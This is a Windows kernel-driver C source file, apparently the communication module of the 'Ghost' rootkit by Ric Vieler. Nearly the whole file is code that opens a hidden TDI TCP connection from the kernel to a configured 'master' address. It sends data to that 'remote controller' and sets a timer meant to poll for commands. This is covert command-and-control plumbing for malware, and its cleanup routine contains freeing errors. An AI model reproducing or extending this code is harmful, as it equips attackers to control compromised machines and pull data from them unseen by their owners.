// commManager
// Copyright Ric Vieler, 2006
// This file supports a TDI connection to
// masterAddress1.2.3.4 : masterPort

#include <ntddk.h>
#include <tdikrnl.h>
#include <stdio.h>
#include <stdlib.h>
#include "commManager.h"
#include "configManager.h"
#include "Ghost.h"
 
// Globals
char*						pSendBuffer = NULL;
PMDL						pSendMdl = NULL;
PMDL						pReceiveMdl = NULL;
PFILE_OBJECT				pFileObject = NULL;
PDEVICE_OBJECT				pDeviceObject = NULL;
PKTIMER						pKernelTimer = NULL;
PKDPC						pKernelDPC = NULL;
PFILE_FULL_EA_INFORMATION	pFileInfo = NULL;

// Completion routine for all events (connect, send and receive)
static NTSTATUS TDICompletionRoutine(IN PDEVICE_OBJECT theDeviceObject, IN PIRP theIrp, IN PVOID theContextP)
{
	if( theContextP != NULL )
		KeSetEvent( (PKEVENT)theContextP, 0, FALSE );

	return( STATUS_MORE_PROCESSING_REQUIRED );
}

// Open a TDI channel and connect to masterAddress1.2.3.4 : masterPort
NTSTATUS OpenTDIConnection()
{
    int							port;
    int							address1;
    int							address2;
    int							address3;
    int							address4;
	NTSTATUS					status;
	UNICODE_STRING				TdiTransportDeviceName;
	OBJECT_ATTRIBUTES           TdiAttributes;
	HANDLE						TdiAddressHandle;
	HANDLE						TdiEndpointHandle;
	IO_STATUS_BLOCK             IoStatusBlock;
	PTA_IP_ADDRESS				pAddress;
	CONNECTION_CONTEXT			connectionContext = NULL;
	ULONG						eaSize; 
	PIRP						pIrp;
	PVOID						pAddressFileObject;
	KEVENT                      irpCompleteEvent;
	KEVENT						connectionEvent;
	TA_IP_ADDRESS				controllerTaIpAddress;
	ULONG						controllerIpAddress;
    USHORT						controllerPort;
	TDI_CONNECTION_INFORMATION  controllerConnection;
	LARGE_INTEGER				timeout;

	static char eaBuffer[	sizeof(FILE_FULL_EA_INFORMATION) + 
				TDI_TRANSPORT_ADDRESS_LENGTH + 
				sizeof(TA_IP_ADDRESS)];

	PFILE_FULL_EA_INFORMATION	pEaBuffer = (PFILE_FULL_EA_INFORMATION)eaBuffer;

	// Build Unicode transport device name.
	RtlInitUnicodeString(	&TdiTransportDeviceName,               
							COMM_TCP_DEVICE_NAME ); // "/device/tcp"

	// create object attribs
	InitializeObjectAttributes( &TdiAttributes,
                &TdiTransportDeviceName,
                OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                0,
                0 );

	pEaBuffer->NextEntryOffset = 0;
	pEaBuffer->Flags = 0;
	pEaBuffer->EaNameLength = TDI_TRANSPORT_ADDRESS_LENGTH;

	// Copy TdiTransportAddress
	memcpy(	pEaBuffer->EaName,
			TdiTransportAddress,
			pEaBuffer->EaNameLength + 1 );
	
	// EaValue represents of the local host IP address and port
	pEaBuffer->EaValueLength = sizeof(TA_IP_ADDRESS);
	
	pAddress = (PTA_IP_ADDRESS)	(pEaBuffer->EaName + pEaBuffer->EaNameLength + 1); 
	pAddress->TAAddressCount = 1;                                                                                                                                                                                                                                     
	pAddress->Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;                                                                                                                                                                                                       
	pAddress->Address[0].AddressType = TDI_ADDRESS_TYPE_IP;                                                                                                                                                                                                           
	pAddress->Address[0].Address[0].sin_port = 0; // any port
	pAddress->Address[0].Address[0].in_addr = 0; // local address
	memset(	pAddress->Address[0].Address[0].sin_zero, 0,
			sizeof(pAddress->Address[0].Address[0].sin_zero) );

	// Get the transport device
	status = ZwCreateFile( &TdiAddressHandle,                       
                GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
                &TdiAttributes,
                &IoStatusBlock,
                0,
                FILE_ATTRIBUTE_NORMAL,
                FILE_SHARE_READ,
                FILE_OPEN,
                0,
                pEaBuffer,
                sizeof(eaBuffer) );
 
	if( !NT_SUCCESS( status ) )
	{
		DbgPrint("comint32: OpenTDIConnection() ZwCreate #1 failed, Status = %0x", status);
		return STATUS_UNSUCCESSFUL;
	}

	// get object handle
	status = ObReferenceObjectByHandle( TdiAddressHandle,   
                FILE_ANY_ACCESS,
                0,
                KernelMode,
                (PVOID *)&pAddressFileObject,
                NULL );


	// Open a TDI endpoint
	eaSize = FIELD_OFFSET(FILE_FULL_EA_INFORMATION, EaName) +
         TDI_CONNECTION_CONTEXT_LENGTH + 1 +
         sizeof(CONNECTION_CONTEXT);

	// Overwrite pEaBuffer
	pFileInfo = (PFILE_FULL_EA_INFORMATION)ExAllocatePool(NonPagedPool, eaSize);
	if( pFileInfo == NULL )
	{
		DbgPrint("comint32: OpenTDIConnection() failed to allocate buffer");
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	// Set file info
	memset(pFileInfo, 0, eaSize);
	pFileInfo->NextEntryOffset = 0;
	pFileInfo->Flags = 0;
	pFileInfo->EaNameLength = TDI_CONNECTION_CONTEXT_LENGTH;
	memcpy(	pFileInfo->EaName,	
			TdiConnectionContext,
			pFileInfo->EaNameLength + 1 ); //includes NULL terminator

	// CONNECTION_CONTEXT is a user defined structure used to sort connections
	// There is only one connection in this example, so CONNECTION_CONTEXT is not used
	pFileInfo->EaValueLength = sizeof(CONNECTION_CONTEXT);
	*(CONNECTION_CONTEXT*)(pFileInfo->EaName+(pFileInfo->EaNameLength + 1)) =
		(CONNECTION_CONTEXT) connectionContext;                                   

	status = ZwCreateFile( &TdiEndpointHandle,                       
                GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
                &TdiAttributes,
                &IoStatusBlock,
                0,
                FILE_ATTRIBUTE_NORMAL,
                FILE_SHARE_READ,
                FILE_OPEN,
                0,
                pFileInfo,
                sizeof(eaBuffer) );

	if( !NT_SUCCESS( status ) )
	{
		DbgPrint("comint32: OpenTDIConnection() ZwCreate #2 failed, Status = %0x", status);
		return STATUS_UNSUCCESSFUL;
	}

	// get object handle
	status = ObReferenceObjectByHandle( TdiEndpointHandle,
               FILE_ANY_ACCESS,
               0,
               KernelMode,
               (PVOID *)&pFileObject,
               NULL );

	// Associate endpoint with address
	pDeviceObject = IoGetRelatedDeviceObject( pAddressFileObject );

	// Define a completion event
	KeInitializeEvent( &irpCompleteEvent, NotificationEvent, FALSE );

	// Build IO Request Packet
	pIrp = TdiBuildInternalDeviceControlIrp( TDI_ASSOCIATE_ADDRESS,
               pDeviceObject,
               pFileObject,
               &irpCompleteEvent,
               &IoStatusBlock );

    if( pIrp == NULL ) 
    {
	    DbgPrint("comint32: No IRP for TDI_ASSOCIATE_ADDRESS");
		return( STATUS_INSUFFICIENT_RESOURCES );
	}

	 // Extend the IRP
	TdiBuildAssociateAddress(pIrp,
               pDeviceObject,
               pFileObject,           
               NULL,                   
               NULL,
               TdiAddressHandle );
	 
	// set completion routine
	IoSetCompletionRoutine( pIrp, TDICompletionRoutine, &irpCompleteEvent, TRUE, TRUE, TRUE);
	 
	// Send the packet
	status = IoCallDriver( pDeviceObject, pIrp );

	 // Wait
    if( status == STATUS_PENDING )
	{
	    DbgPrint("comint32: OpenTDIConnection() Waiting on IRP (associate)...");
		KeWaitForSingleObject(&irpCompleteEvent, Executive, KernelMode, FALSE, 0);
	}

	if( ( status != STATUS_SUCCESS) && 
		( status != STATUS_PENDING ) )
	{
		 DbgPrint("comint32: OpenTDIConnection() IoCallDriver #1 failed. Status = %0x", status);
		 return STATUS_UNSUCCESSFUL;
	}

	// Connect to the remote controller
	KeInitializeEvent(&connectionEvent, NotificationEvent, FALSE);

	// build connection packet
	pIrp = TdiBuildInternalDeviceControlIrp( TDI_CONNECT,
               pDeviceObject,
               pFileObject,
               &connectionEvent,
               &IoStatusBlock );

	if( pIrp == NULL ) 
	{
		DbgPrint("comint32: OpenTDIConnection() could not get an IRP for TDI_CONNECT");
		return( STATUS_INSUFFICIENT_RESOURCES );
	}

	// Initialize controller data
	address1 = atoi(masterAddress1);
	address2 = atoi(masterAddress2);
	address3 = atoi(masterAddress3);
	address4 = atoi(masterAddress4);
	port = atoi(masterPort);
	controllerPort = HTONS(port);
	controllerIpAddress = INETADDR(address1,address2,address3,address4);
	controllerTaIpAddress.TAAddressCount = 1;
	controllerTaIpAddress.Address[0].AddressLength = TDI_ADDRESS_LENGTH_IP;
	controllerTaIpAddress.Address[0].AddressType = TDI_ADDRESS_TYPE_IP;
	controllerTaIpAddress.Address[0].Address[0].sin_port = controllerPort;
	controllerTaIpAddress.Address[0].Address[0].in_addr = controllerIpAddress;
	controllerConnection.UserDataLength = 0;
	controllerConnection.UserData = 0;
	controllerConnection.OptionsLength = 0;
	controllerConnection.Options = 0;
	controllerConnection.RemoteAddressLength = sizeof(controllerTaIpAddress);
	controllerConnection.RemoteAddress = &controllerTaIpAddress;

	// add controller data to the packet
	TdiBuildConnect( pIrp,
               pDeviceObject,
               pFileObject,
               NULL,
               NULL,
               NULL,
               &controllerConnection,
               0 );

	// set completion routine
	IoSetCompletionRoutine( pIrp, TDICompletionRoutine, &connectionEvent, TRUE, TRUE, TRUE);
	 
	// Send the packet
	status = IoCallDriver( pDeviceObject, pIrp );

	// wait
	if( status == STATUS_PENDING )
	{
		DbgPrint("comint32: OpenTDIConnection() waiting on IRP (connect)...");
		KeWaitForSingleObject(&connectionEvent, Executive, KernelMode, FALSE, 0);
	}

	if( ( status != STATUS_SUCCESS ) && 
		( status != STATUS_PENDING ) )
	{
		DbgPrint("comint32: OpenTDIConnection() Connection failed. Status = %0x", status);
		return( STATUS_UNSUCCESSFUL );
	}

	// Start a Deferred Procedure Call
	// Objects must be non paged
	pKernelTimer = ExAllocatePool( NonPagedPool, sizeof( KTIMER ) );
	pKernelDPC = ExAllocatePool( NonPagedPool, sizeof( KDPC ) );

	timeout.QuadPart = -10;

	KeInitializeTimer( pKernelTimer );
	KeInitializeDpc( pKernelDPC, timerDPC, NULL );

	if( KeSetTimerEx( pKernelTimer, timeout, 500, pKernelDPC )	) // 1/2 second
	{
		DbgPrint("comint32: OpenTDIConnection() Timer was already set.");
	}

	return STATUS_SUCCESS;
}

// Clean up 
void CloseTDIConnection()
{
	// KeFlushQueuedDPCs would be nice here
	KeCancelTimer( pKernelTimer );
	ExFreePool( pKernelTimer );
	ExFreePool( pKernelDPC );
	if( pFileInfo != NULL )
		ExFreePool( pFileInfo );
	if( pKernelTimer == NULL )
		ExFreePool( pKernelTimer );
	if( pKernelDPC == NULL )
		ExFreePool( pKernelDPC );
	if( pSendBuffer != NULL )
		ExFreePool( pSendBuffer );
	if( pSendMdl != NULL )
		IoFreeMdl( pSendMdl );
	if( pReceiveMdl != NULL )
		IoFreeMdl( pReceiveMdl );
}

NTSTATUS SendToRemoteController( char* buffer )
{
	NTSTATUS		status;
	ULONG			bufferLength;
	KEVENT			SendEvent;
	PIRP			pIrp;
	IO_STATUS_BLOCK	IoStatusBlock;

	KeInitializeEvent( &SendEvent, NotificationEvent, FALSE );

	bufferLength = strlen( buffer );

	if( pSendBuffer != NULL )
		ExFreePool( pSendBuffer );
	pSendBuffer = ExAllocatePool( NonPagedPool, bufferLength );
	memcpy( pSendBuffer, buffer, bufferLength );

	// build an IO Request Packet
	pIrp = TdiBuildInternalDeviceControlIrp( TDI_SEND,
               pDeviceObject,
               pFileObject,
               &SendEvent,
               &IoStatusBlock );

	if( pIrp == NULL ) 
	{
		DbgPrint( "comint32: SendToRemoteController() could not get an IRP for TDI_SEND" );
		return( STATUS_INSUFFICIENT_RESOURCES );
	}

	if( pSendMdl != NULL )
		IoFreeMdl( pSendMdl );

	pSendMdl = IoAllocateMdl( pSendBuffer, bufferLength, FALSE, FALSE, pIrp );
	
	if( pSendMdl == NULL ) 
	{
		DbgPrint("comint32: SendToRemoteController() could not get an MDL for TDI_SEND");
		return( STATUS_INSUFFICIENT_RESOURCES );
	}

	__try
	{
		MmProbeAndLockPages(	pSendMdl,
								KernelMode,
								IoModifyAccess );
	}
	__except( EXCEPTION_EXECUTE_HANDLER ) 
	{
		DbgPrint("comint32: SendToRemoteController() ProbeAndLock exception.");
		return( STATUS_UNSUCCESSFUL );
	}

	// Extend the packet
	TdiBuildSend( pIrp,
                  pDeviceObject,
                  pFileObject,
                  NULL,
                  NULL,
                  pSendMdl,
                  0,
                  bufferLength );

	// set completion routine
	IoSetCompletionRoutine( pIrp, TDICompletionRoutine, &SendEvent, TRUE, TRUE, TRUE);

	// Send the packet
	status = IoCallDriver( pDeviceObject, pIrp );

	// wait
	if( status == STATUS_PENDING )
	{
		DbgPrint("comint32: SendToRemoteController() waiting on IRP (send)...");
		KeWaitForSingleObject( &SendEvent, Executive, KernelMode, FALSE, 0 );
	}

	if( ( status != STATUS_SUCCESS ) && 
		( status != STATUS_PENDING ) )
	{
		DbgPrint("comint32: SendToRemoteController() Send failed. Status = %0x", status);
		return( STATUS_UNSUCCESSFUL );
	}

	return STATUS_SUCCESS;
}

// called periodically
VOID timerDPC( PKDPC Dpc, PVOID DeferredContext, PVOID sys1, PVOID sys2 )
{
	// poll for commands
}
